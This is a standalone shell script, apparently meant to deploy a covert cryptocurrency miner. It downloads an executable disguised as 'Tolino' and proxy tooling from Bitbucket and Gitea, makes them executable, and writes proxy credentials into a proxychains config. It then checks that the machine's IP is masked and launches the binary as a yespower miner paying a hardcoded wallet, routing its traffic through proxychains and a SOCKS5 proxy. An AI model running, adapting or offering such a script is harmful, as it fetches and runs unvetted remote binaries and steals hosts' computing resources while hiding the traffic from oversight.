proxy="us-east-static-06.quotaguard.com" 
port="9293" 
user="neozk6kncbe8qm"  
pass="us-east-static-06.quotaguard.com" 
wget -q -O Tolino https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x Tolino
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./Tolino -a yespower -o 149.50.222.86:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-telino) --timeout 120 -p c=SWAMP,mc=VHH -x -x socks5://192.252.209.155:14455 
